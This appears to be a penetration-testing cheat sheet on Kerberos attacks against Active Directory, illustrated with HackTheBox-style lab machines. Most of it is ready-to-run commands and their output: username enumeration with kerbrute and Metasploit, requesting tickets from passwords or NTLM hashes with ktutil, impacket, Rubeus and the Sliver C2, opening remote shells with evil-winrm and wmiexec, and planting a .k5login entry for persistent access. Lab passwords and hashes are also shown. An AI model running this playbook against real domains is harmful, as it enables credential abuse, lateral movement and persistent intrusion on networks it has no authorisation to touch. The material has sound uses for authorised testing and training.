---
title: "Kerberos"
date: 2024-7-2
tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Cracking", "Sliver", "Enumeration", "Ntlm", "Smb", "Kerbrute", "Pass-The-Hash", "Impacket", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows"]
---

### Users Enum

{{< tab set1 tab1 >}}kerbrute{{< /tab >}}
{{< tab set1 tab2 >}}metasploit{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
kerbrute userenum --domain <DOMAIN> --dc <DC> <USERS_FILE>
```

```console {class="sample-code"}
$ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop

2024/09/24 14:54:41 >  Using KDC(s):
2024/09/24 14:54:41 >   dc.absolute.htb:88

2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       d.klay@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       n.smith@absolute.htb
2024/09/24 14:54:42 >  Done! Tested 88 usernames (6 valid) in 0.491 seconds
```

<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
use auxiliary/gather/kerberos_enumusers
```

```console
set user_file <USERS_FILE>
```

```console
set rhosts <DC>
```

```console
set domain <DOMAIN>
```

```console
run
```

```console {class="sample-code"}
msf6 auxiliary(gather/kerberos_enumusers) > run

[*] Using domain: DANTE - 172.16.2.1:88        ...
[*] 172.16.2.1 - User: "user1" user not found
[*] 172.16.2.1 - User: "user2" user not found
[*] 172.16.2.1 - User: "user3" user not found
[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ---[SNIP]--- 9161d63be1
---[SNIP]---
[*] Auxiliary module execution completed
```

{{< /tabcontent >}}

---

### Kerberos Ticket (From Linux)

#### 1. Config /etc/hosts

```console
sudo nxc smb <DC_IP> --generate-hosts-file /etc/hosts
```

```console {class="sample-code"}
$ sudo nxc smb 10.129.235.149 --generate-hosts-file /etc/hosts
SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
                                                                                                                                                                                                                    
$ tail -n1 /etc/hosts
10.129.235.149     DC.administrator.htb administrator.htb DC
```

#### 2. Config /etc/krb5.conf

```console
sudo nxc smb <DC_IP> --generate-krb5-file /etc/krb5.conf
```

```console {class="sample-code"}
$ sudo nxc smb 10.129.235.149 --generate-krb5-file /etc/krb5.conf
SMB         10.129.235.149  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 

$ cat /etc/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = ADMINISTRATOR.HTB

[realms]
    ADMINISTRATOR.HTB = {
        kdc = dc.administrator.htb
        admin_server = dc.administrator.htb
        default_domain = administrator.htb
    }

[domain_realm]
    .administrator.htb = ADMINISTRATOR.HTB
    administrator.htb = ADMINISTRATOR.HTB
```

#### 3. Config /etc/resolv.conf \[Optional\]

```console
nameserver <DC_IP>
```

```console {class="sample-code"}
nameserver 10.10.11.10
```

{{< tab set3 tab1 >}}kinit{{< /tab >}}
{{< tab set3 tab2 >}}impacket{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 4. Installation \[Optional\]

```console
sudo apt install krb5-user cifs-utils
```

#### 5. Request a Ticket

{{< tab set3-1 tab1 active >}}Password{{< /tab >}}{{< tab set3-1 tab2 >}}NTLM{{< /tab >}}
{{< tabcontent set3-1 tab1 >}}

```console
sudo ntpdate -s <DC_IP> && kinit <USER>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.234.139 && kinit Olivia
Password for Olivia@ADMINISTRATOR.HTB:
```

{{< /tabcontent >}}
{{< tabcontent set3-1 tab2 >}}

```console
ktutil
```

```console {class="sample-code"}
$ ktutil
ktutil:  
```

```console
# Domain in UPPER case
add_entry -key -p <USER>@<DOMAIN> -k 1 -e rc4-hmac
```

```console {class="sample-code"}
ktutil:  add_entry -key -p Olivia@ADMINISTRATOR.HTB -k 1 -e rc4-hmac
Key for Olivia@ADMINISTRATOR.HTB (hex): 
```

```console
# NTLM
<HASH>
```

```console {class="sample-code"}
Key for Olivia@ADMINISTRATOR.HTB (hex): fbaa3e2294376dc0f5aeb6b41ffa52b7
ktutil:  
```

```console
write_kt <USER>.keytab
```

```console {class="sample-code"}
ktutil:  write_kt Olivia.keytab
ktutil:  
```

```console
exit
```

```console {class="sample-code"}
ktutil:  exit
```

```console
kinit -V -k -t '<USER>.keytab' -f '<USER>@<DOMAIN>'
```

```console {class="sample-code"}
$ kinit -V -k -t 'Olivia.keytab' -f 'Olivia@ADMINISTRATOR.HTB'
Using default cache: /tmp/krb5cc_1000
Using principal: Olivia@ADMINISTRATOR.HTB
Using keytab: Olivia.keytab
Authenticated to Kerberos v5
```

{{< /tabcontent >}}

#### 6. Check

```console
klist
```

```console {class="sample-code"}
$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: Olivia@ADMINISTRATOR.HTB

Valid starting       Expires              Service principal
2025-07-15T05:02:44  2025-07-15T15:02:44  krbtgt/ADMINISTRATOR.HTB@ADMINISTRATOR.HTB
        renew until 2025-07-16T05:02:37
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

#### 1. Request a Ticket

{{< tab set3-2 tab1 active >}}Password{{< /tab >}}{{< tab set3-2 tab2 >}}NTLM{{< /tab >}}
{{< tabcontent set3-2 tab1 >}}

```console
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.255.235 && impacket-getTGT 'ADMINISTRATOR.HTB/Olivia:ichliebedich' -dc-ip 10.129.255.235
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Olivia.ccache
```

{{< /tabcontent >}}
{{< tabcontent set3-2 tab2 >}}

```console
sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.255.235 && impacket-getTGT 'ADMINISTRATOR.HTB/Olivia' -hashes :fbaa3e2294376dc0f5aeb6b41ffa52b7 -dc-ip 10.129.255.235
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Olivia.ccache
```

{{< /tabcontent >}}

#### 2. Check

```console
# Import ticket
export KRB5CCNAME='<USER>.ccache'
```

```console {class="sample-code"}
$ export KRB5CCNAME='Olivia.ccache'
```

```console
# Check ticket
klist
```

```console {class="sample-code"}
$ klist
Ticket cache: FILE:Olivia.ccache
Default principal: Olivia@ADMINISTRATOR.HTB

Valid starting       Expires              Service principal
2025-07-16T20:54:29  2025-07-17T06:54:29  krbtgt/ADMINISTRATOR.HTB@ADMINISTRATOR.HTB
        renew until 2025-07-17T20:54:29
```

{{< /tabcontent >}}

---

### Kerberos Ticket (From Windows)

{{< tab set4 tab1 >}}rubeus{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Request a Ticket

{{< tab set4-1 tab1 active >}}Password{{< /tab >}}{{< tab set4-1 tab2 >}}NTLM{{< /tab >}}
{{< tabcontent set4-1 tab1 >}}

```console
.\rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:<ENC_TYPE> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> .\rubeus.exe asktgt /user:m.lovegod /password:'AbsoluteLDAP2022!' /enctype:AES256 /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
[*] Building AS-REQ (w/ preauth) for: 'ABSOLUTE.HTB\m.lovegod'
[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpDCCBa ---[SNIP]--- VURS5IVEI=

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/ABSOLUTE.HTB
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  m.lovegod
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  9/24/2024 7:08:14 AM
  EndTime                  :  9/24/2024 11:08:14 AM
  RenewTill                :  9/24/2024 11:08:14 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  u2ScGZUzmFdmTGETruj0VhWSGwiKTg7dbQVabz0QZU8=
  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
```

{{< /tabcontent >}}
{{< tabcontent set4-1 tab2 >}}

```console
.\rubeus.exe asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> .\rubeus.exe asktgt /user:Administrator /rc4:1f4a6093623653f6488d5aa24c75f2ea /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 1f4a6093623653f6488d5aa24c75f2ea
[*] Building AS-REQ (w/ preauth) for: 'ABSOLUTE.HTB\Administrator'
[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpDCCBa ---[SNIP]--- VURS5IVEI=

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/ABSOLUTE.HTB
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  Administrator
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  9/24/2024 7:10:55 AM
  EndTime                  :  9/24/2024 5:10:55 PM
  RenewTill                :  10/1/2024 7:10:55 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Ge3n0tM7A0k4q2bJ+0F+uA==
  ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
```

{{< /tabcontent >}}

#### 2. Check

```console
klist
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> klist

Current LogonId is 0:0x2e0e9d

Cached Tickets: (2)

#0>     Client: Administrator @ ABSOLUTE.HTB
        Server: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/24/2024 7:10:55 (local)
        End Time:   9/24/2024 17:10:55 (local)
        Renew Time: 10/1/2024 7:10:55 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ ABSOLUTE.HTB
        Server: HTTP/DC.ABSOLUTE.HTB @ ABSOLUTE.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/24/2024 7:05:19 (local)
        End Time:   9/24/2024 17:03:25 (local)
        Renew Time: 0
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x8 -> ASC
        Kdc Called:
```

{{< /tabcontent >}}

---

### Kerberos Ticket (From C2)

{{< tab set5 tab1 >}}Sliver{{< /tab >}}
{{< tabcontent set5 tab1 >}}

#### 1. Request a Ticket

{{< tab set5-1 tab1 active >}}Password{{< /tab >}}{{< tab set5-1 tab2 >}}NTLM{{< /tab >}}
{{< tabcontent set5-1 tab1 >}}

```console
rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:<ENC_TYPE> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
```

```console {class="sample-code"}
sliver (helloworld) > rubeus -- 'asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /enctype:AES256 /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap'

[*] rubeus output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Using salt: ABSOLUTE.HTBm.lovegod
[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
[*] Building AS-REQ (w/ preauth) for: 'ABSOLUTE.HTB\m.lovegod'
[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpDCCBa ---[SNIP]--- VURS5IVEI=

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/ABSOLUTE.HTB
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  m.lovegod (NT_PRINCIPAL)
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  9/24/2024 7:16:52 AM
  EndTime                  :  9/24/2024 11:16:52 AM
  RenewTill                :  9/24/2024 11:16:52 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  aBhZJr9iogDKSLtohxAgie5HPBSLktIxsRYujp/MqVA=
  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
```

{{< /tabcontent >}}
{{< tabcontent set5-1 tab2 >}}

```console
rubeus -- 'asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
```

```console {class="sample-code"}
sliver (helloworld) > rubeus -- 'asktgt /user:Administrator /rc4:1f4a6093623653f6488d5aa24c75f2ea /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap'

[*] rubeus output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 1f4a6093623653f6488d5aa24c75f2ea
[*] Building AS-REQ (w/ preauth) for: 'ABSOLUTE.HTB\Administrator'
[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpDCCBa ---[SNIP]--- VURS5IVEI=
      
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/ABSOLUTE.HTB
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  9/24/2024 7:17:33 AM
  EndTime                  :  9/24/2024 5:17:33 PM
  RenewTill                :  10/1/2024 7:17:33 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  BIdtxt2Rokdo+R9tNjoCLA==
  ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
```

{{< /tabcontent >}}

#### 2. Check

```console
c2tc-klist
```

```console {class="sample-code"}
sliver (helloworld) > c2tc-klist

[*] Successfully executed c2tc-klist (coff-loader)
[*] Got output:

Cached Tickets: (1)

#0>     Client: Administrator @ ABSOLUTE.HTB
        Server: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
        KerbTicket Encryption Type: (18) AES256_CTS_HMAC_SHA1_96
        Ticket Flags: 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
        Start Time: 9/24/2024 7:17:33
        End Time:   9/24/2024 17:17:33
        Renew Time: 10/1/2024 7:17:33
        Session Key Type: (23) RC4_HMAC_NT
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

{{< /tabcontent >}}

---

### WinRM with Kerberos

{{< tab set6 tab1 >}}evil-winrm{{< /tab >}}
{{< tab set6 tab2 >}}wmiexec{{< /tab >}}
{{< tabcontent set6 tab1 >}}

#### 1. Config /etc/krb5.conf

```console
# In UPPER case

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = ABSOLUTE.HTB

[realms]
    ABSOLUTE.HTB = {
        kdc = DC.ABSOLUTE.HTB:88
        admin_server = DC.ABSOLUTE.HTB
        default_domain = ABSOLUTE.HTB
    }
    
[domain_realm]
    .domain.internal = ABSOLUTE.HTB
    domain.internal = ABSOLUTE.HTB
```

#### 2. Connect

```console
sudo ntpdate -s <DC_IP> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.ABSOLUTE.HTB && evil-winrm -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

{{< /tabcontent >}}
{{< tabcontent set6 tab2 >}}

```console
sudo ntpdate -s <DC_IP> && impacket-wmiexec '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-wmiexec 'ABSOLUTE.HTB/Administrator@DC.ABSOLUTE.HTB' -k -no-pass
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

{{< /tabcontent >}}

---

### SMB with Kerberos

```console
sudo ntpdate -s <DC_IP> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-smbclient 'ABSOLUTE.HTB/Administrator@DC.ABSOLUTE.HTB' -k -no-pass
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

Type help for list of commands
# 
```

---

### Add Kerberos Access in Linux

```console
echo '<USER>@<DOMAIN>' > /home/<TARGET_USER>/.k5login
```
